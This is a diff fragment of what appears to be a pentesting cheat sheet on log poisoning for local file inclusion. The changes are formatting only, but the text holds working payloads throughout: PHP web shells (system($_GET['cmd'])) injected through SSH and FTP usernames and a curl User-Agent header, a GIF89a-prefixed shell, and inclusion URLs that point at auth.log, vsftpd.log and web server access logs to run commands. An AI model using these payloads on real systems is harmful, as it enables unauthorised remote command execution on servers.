@@ -308,32 +308,32 @@ GIF89a; <?php system($_GET['cmd']); ?>
 
 # <kbd>Log Poisoning SSH</kbd>
 
-> /var/log/auth.log
+/var/log/auth.log
 
 ```php
 ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.2
 ```
 
-> file.php?file=`/var/log/auth.log&cmd=id`
+file.php?file=`/var/log/auth.log&cmd=id`
 
 ---
 
 # <kbd>Log Poisoning FTP</kbd>
 
-> /var/log/vsftpd.log
+/var/log/vsftpd.log
 
 ```cmd
 lftp -u '<?php system($_GET["cmd"]); ?>', 192.168.1.2
 ```
 
-> file.php?file=`/var/log/vsftpd.log&cmd=id`
+file.php?file=`/var/log/vsftpd.log&cmd=id`
 
 ---
 
 # <kbd>Log Poisoning HTTP</kbd>
 
-- Apache2: `/var/log/apache2/access.log`
-- Nginx: `/var/log/nginx/access.log`
+Apache2: `/var/log/apache2/access.log`  
+Nginx: `/var/log/nginx/access.log`
 
 ```cmd
 curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
